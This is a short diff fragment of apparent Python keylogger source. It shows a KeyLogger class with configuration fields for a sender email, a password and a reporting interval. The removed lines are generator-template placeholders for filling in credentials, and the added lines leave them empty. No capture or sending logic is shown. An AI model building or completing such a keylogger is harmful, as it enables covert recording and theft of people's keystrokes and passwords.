@@ -6,10 +6,10 @@ from threading import Timer
 from datetime import datetime
 import keyboard
 
-Sender_Email = '''+f'"{email1}"'+f'''
+Sender_Email = ""
 Reciever_Email = Sender_Email
-Password = '''+f'"{password}"'+f'''
-interval = '''+str(interval)+f'''
+Password = ""
+interval = ""
 
 class KeyLogger:
     def __init__(self, time_interval, email, password):
